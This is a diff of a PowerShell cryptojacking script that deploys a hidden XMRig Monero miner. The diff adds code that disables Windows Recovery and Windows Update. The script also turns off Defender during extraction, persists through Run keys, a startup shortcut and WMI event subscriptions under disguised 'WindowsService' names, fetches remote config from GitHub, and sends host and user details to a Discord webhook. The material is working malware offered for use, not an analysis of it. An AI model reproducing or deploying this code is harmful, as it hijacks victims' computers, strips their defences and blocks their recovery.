@@ -1,12 +1,12 @@
 # ============================================================
-#  XMR Silent Miner Deployer v3 (Cleaned for LO)
+#  XMR Silent Miner Deployer v3 (ULTRA HARDENED)
 #  - Pulls config from PUBLIC GitHub repo
 #  - Dynamic idle/active CPU throttle
 #  - Survives reboots (schtasks + registry + startup folder)
+#  - HARDENED: WinRE Disabled + Updates Blocked
 # ============================================================
 
 # ==================== CONFIG ====================
-# [!] LO: Removed GitHub Token logic - Repository is now assumed PUBLIC
 $ghOwner = "itzcurled"
 $ghRepo = "dogman"
 $ghConfigPath = "config.json"
@@ -33,7 +33,31 @@ $worker = "$env:COMPUTERNAME"
 
 # ==================== FUNCTIONS ====================
 
+function Disable-WindowsHardening {
+    # ── 1. Disable Windows Recovery Environment (WinRE) ──
+    try {
+        reagentc.exe /disable /erroraction silentlycontinue
+    } catch {}
+
+    # ── 2. Block Reset Page in Settings UI ──
+    try {
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+        if (!(Test-Path $regPath)) { New-Item $regPath -Force | Out-Null }
+        Set-ItemProperty -Path $regPath -Name "NoRecoveryPage" -Value 1 -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    # ── 3. Kill & Disable Windows Update Services ──
+    try {
+        $services = @("wuauserv", "bits", "dosvc")
+        foreach ($svc in $services) {
+            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
+        }
+    } catch {}
+}
+
 function Install-Miner {
+    # Aggressively kill existing miner and watchdog processes
     try {
         Get-CimInstance Win32_Process -ErrorAction Stop | Where-Object { 
             ($_.ExecutablePath -like "*WindowsServices*") -or 
@@ -44,11 +68,13 @@ function Install-Miner {
         }
     }
     catch {
+        # Fallback if WMI is broken or out of memory
         Get-Process -Name "svchost", "wscript" -ErrorAction SilentlyContinue | Where-Object {
             ($_.Path -like "*WindowsServices*") -or ($_.CommandLine -like "*monitor.vbs*") -or ($_.CommandLine -like "*watchdog.ps1*")
         } | Stop-Process -Force -ErrorAction SilentlyContinue
     }
     
+    # Absolute brute force fallback for locked files
     try {
         taskkill /F /IM wscript.exe /T 2>$null
         $lockedProcs = Get-Process | Where-Object { $_.Path -like "*WindowsServices\svchost.exe*" }
@@ -59,10 +85,12 @@ function Install-Miner {
     }
     catch {}
     
+    # Wait a moment to ensure file locks are released
     Start-Sleep -Seconds 3
 
     New-Item -ItemType Directory -Path $installDir -Force | Out-Null
 
+    # Force all modern TLS protocols
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
     }
@@ -70,8 +98,10 @@ function Install-Miner {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     }
 
+    # Download with retry: WebClient -> Invoke-WebRequest -> BitsTransfer
     $downloaded = $false
 
+    # Method 1: WebClient
     if (-not $downloaded) {
         try {
             $wc = New-Object System.Net.WebClient
@@ -82,6 +112,7 @@ function Install-Miner {
         catch {}
     }
 
+    # Method 2: Invoke-WebRequest
     if (-not $downloaded) {
         try {
             Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UseBasicParsing -ErrorAction Stop
@@ -90,6 +121,7 @@ function Install-Miner {
         catch {}
     }
 
+    # Method 3: BitsTransfer
     if (-not $downloaded) {
         try {
             Import-Module BitsTransfer -ErrorAction SilentlyContinue
@@ -103,10 +135,12 @@ function Install-Miner {
 
     if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
 
+    # Try to disable Defender real-time protection before extraction
     try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop } catch {}
 
     Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
 
+    # Race Defender: find and copy xmrig.exe immediately, retry up to 3 times
     $copied = $false
     for ($attempt = 1; $attempt -le 3; $attempt++) {
         $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
@@ -117,12 +151,14 @@ function Install-Miner {
                 break
             } catch {}
         }
+        # If Defender ate it, re-extract and try again
         if ($attempt -lt 3) {
             Start-Sleep -Seconds 2
             try { Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force } catch {}
         }
     }
 
+    # Re-enable Defender
     try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}
 
     if (-not $copied) { throw "xmrig.exe not found in archive (likely deleted by antivirus)" }
@@ -313,6 +349,7 @@ while ($true) {
             $lastState = $state
         }
 
+        # Pull config from GitHub every 30 minutes
         if ($configTimer.Elapsed.TotalSeconds -ge 1800) {
             $cfg = Fetch-GithubConfig
             Apply-Config -cfg $cfg
@@ -390,18 +427,14 @@ function Set-Persistence {
 
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     try {
-        Set-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" `
-            -Value "`"$xmrigExe`" --config=`"$configFile`"" -Force
-        Set-ItemProperty -Path $regPath -Name "WindowsServiceMonitor" `
-            -Value "wscript.exe `"$watchdogVbs`"" -Force
+        Set-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" -Value "`"$xmrigExe`" --config=`"$configFile`"" -Force
+        Set-ItemProperty -Path $regPath -Name "WindowsServiceMonitor" -Value "wscript.exe `"$watchdogVbs`"" -Force
     } catch {}
 
     try {
         $regPathLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty -Path $regPathLM -Name "WindowsServiceUpdate" `
-            -Value "`"$xmrigExe`" --config=`"$configFile`"" -Force -ErrorAction Stop
-        Set-ItemProperty -Path $regPathLM -Name "WindowsServiceMonitor" `
-            -Value "wscript.exe `"$watchdogVbs`"" -Force -ErrorAction Stop
+        Set-ItemProperty -Path $regPathLM -Name "WindowsServiceUpdate" -Value "`"$xmrigExe`" --config=`"$configFile`"" -Force -ErrorAction Stop
+        Set-ItemProperty -Path $regPathLM -Name "WindowsServiceMonitor" -Value "wscript.exe `"$watchdogVbs`"" -Force -ErrorAction Stop
     } catch {}
 
     $startupDir = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
@@ -411,7 +444,7 @@ function Set-Persistence {
         $sc = $ws.CreateShortcut($lnkPath)
         $sc.TargetPath = "wscript.exe"
         $sc.Arguments = "`"$watchdogVbs`""
-        $sc.WindowStyle = 7  # minimized
+        $sc.WindowStyle = 7
         $sc.Description = "Windows Service Monitor"
         $sc.Save()
     }
@@ -428,25 +461,25 @@ function Set-Persistence {
         $timerName = "WindowsServiceTimer"
         try { Get-WMIObject -Namespace root\cimv2 -Class __IntervalTimerInstruction -Filter "TimerID='$timerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue } catch {}
         Set-WmiInstance -Namespace root\cimv2 -Class __IntervalTimerInstruction -Arguments @{
-            TimerID       = $timerName
+            TimerID = $timerName
             IntervalBetweenEvents = 300000 
         } -ErrorAction Stop | Out-Null
 
         $query = "SELECT * FROM __TimerEvent WHERE TimerID = '$timerName'"
         $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
-            Name           = $filterName
+            Name = $filterName
             EventNameSpace = 'root\cimv2'
-            QueryLanguage  = 'WQL'
-            Query          = $query
+            QueryLanguage = 'WQL'
+            Query = $query
         } -ErrorAction Stop
 
         $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
-            Name                = $consumerName
+            Name = $consumerName
             CommandLineTemplate = "wscript.exe `"$watchdogVbs`""
         } -ErrorAction Stop
 
         Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
-            Filter   = $filter
+            Filter = $filter
             Consumer = $consumer
         } -ErrorAction Stop | Out-Null
     }
@@ -489,21 +522,14 @@ function Add-Exclusion {
 
 function Enable-HugePages {
     try {
-        $tmpCfg = "$env:TEMP\secpol.cfg"
-        $tmpDb = "$env:TEMP\secpol.sdb"
+        $tmpCfg = "$env:TEMP\secpol.cfg"; $tmpDb = "$env:TEMP\secpol.sdb"
         secedit /export /cfg $tmpCfg /quiet 2>$null
         $content = Get-Content $tmpCfg -Raw
-        $sid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate(
-            [System.Security.Principal.SecurityIdentifier]).Value
+        $sid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
         if ($content -match 'SeLockMemoryPrivilege\s*=\s*(.*)') {
             $existing = $Matches[1]
-            if ($existing -notlike "*$sid*") {
-                $content = $content -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid"
-            }
-        }
-        else {
-            $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeLockMemoryPrivilege = *$sid"
-        }
+            if ($existing -notlike "*$sid*") { $content = $content -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid" }
+        } else { $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeLockMemoryPrivilege = *$sid" }
         Set-Content -Path $tmpCfg -Value $content -Force
         secedit /configure /db $tmpDb /cfg $tmpCfg /quiet 2>$null
         Remove-Item $tmpCfg, $tmpDb -Force -ErrorAction SilentlyContinue
@@ -519,33 +545,25 @@ function Send-DiscordWebhook {
             try { $osName = [System.Environment]::OSVersion.VersionString } catch {}
         }
         $payload = @{
-            username   = "SOINION"
+            username = "SOINION"
             avatar_url = "https://i.imgur.com/4M34hiw.png"
-            embeds     = @(
-                @{
-                    title     = "New Miner Deployed!"
-                    color     = 3447003
-                    fields    = @(
-                        @{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }
-                        @{ name = "User"; value = "$env:USERNAME"; inline = $true }
-                        @{ name = "OS"; value = "$osName"; inline = $false }
-                    )
-                    footer    = @{ text = "Deploy script executed successfully" }
+            embeds = @(@{
+                    title = "New Miner Deployed!"
+                    color = 3447003
+                    fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }, @{ name = "OS"; value = "$osName"; inline = $false })
+                    footer = @{ text = "Deploy script executed successfully" }
                     timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
-                }
-            )
+            })
         } | ConvertTo-Json -Depth 5
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop | Out-Null
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 }
 
 function Disable-Sleep {
     try {
         powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
-        powercfg /change standby-timeout-ac 0
-        powercfg /change standby-timeout-dc 0
-        powercfg /change hibernate-timeout-ac 0
-        powercfg /change hibernate-timeout-dc 0
+        powercfg /change standby-timeout-ac 0; powercfg /change standby-timeout-dc 0
+        powercfg /change hibernate-timeout-ac 0; powercfg /change hibernate-timeout-dc 0
         powercfg /hibernate off 2>$null
     } catch {}
 }
@@ -553,6 +571,7 @@ function Disable-Sleep {
 # ==================== MAIN ====================
 try {
     Add-Exclusion
+    Disable-WindowsHardening  # <── LOCKDOWN ENGAGED
     Disable-Sleep
     Enable-HugePages
     Install-Miner
@@ -564,7 +583,7 @@ try {
     Start-Sleep -Seconds 4
     Start-Watchdog
     Send-DiscordWebhook
-    [Console]::WriteLine("[+] Miner + Watchdog deployed - $rigId pulling config from github.com/$ghOwner/$ghRepo")
+    [Console]::WriteLine("[+] Miner + Watchdog deployed — $rigId pulling config from github.com/$ghOwner/$ghRepo")
 }
 catch {
     [Console]::WriteLine("[-] Deployment failed: $_")
